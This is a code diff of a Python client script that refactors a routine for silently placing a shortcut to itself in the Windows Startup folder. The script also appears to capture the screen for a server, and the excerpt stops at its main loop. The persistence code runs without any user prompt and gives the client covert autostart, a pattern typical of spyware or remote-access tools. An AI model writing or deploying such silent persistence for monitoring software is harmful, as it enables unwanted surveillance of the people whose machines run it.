@@ -3,7 +3,6 @@ import subprocess
 import time
 import os
 from datetime import datetime
-from win32com.client import Dispatch
 import pyautogui
 import tempfile
 import platform
@@ -12,30 +11,23 @@ from math import ceil
 
 save = tempfile.mkdtemp("screen")
 SERVER_IP_ADDRESS = "http://127.0.0.1:5000/"
-username = os.getlogin()
-source = os.listdir()
-destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
-cwd = os.getcwd()
 response = ""
 
-def main():
-    path = os.path.join(destination, "Client.pyw - Shortcut.lnk")
-    target = "" + cwd + r"\Client.pyw"
-    icon = "" + cwd + r"\Client.pyw"
-    for files in source:
-        if files == "Client.pyw":
-            shell = Dispatch('WScript.Shell')
-            shortcut = shell.CreateShortCut(path)
-            shortcut.Targetpath = target
-            shortcut.IconLocation = icon
-            shortcut.save()
-
-shortcut = 'Client.pyw - Shortcut.lnk'
-if shortcut in os.listdir(destination):
-    pass
-else:
-    main()
-
+if platform.system() == 'Windows':
+    from win32com.client import Dispatch
+    username = os.getlogin()
+    destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
+    if 'Client.pyw - Shortcut.lnk' not in os.listdir(destination):
+        path = os.path.join(destination, "Client.pyw - Shortcut.lnk")
+        target = "" + os.getcwd() + r"\Client.pyw"
+        icon = "" + os.getcwd() + r"\Client.pyw"
+        for files in os.listdir():
+            if files == "Client.pyw":
+                shell = Dispatch('WScript.Shell')
+                shortcut = shell.CreateShortCut(path)
+                shortcut.Targetpath = target
+                shortcut.IconLocation = icon
+                shortcut.save()
 
 while True:
     try:
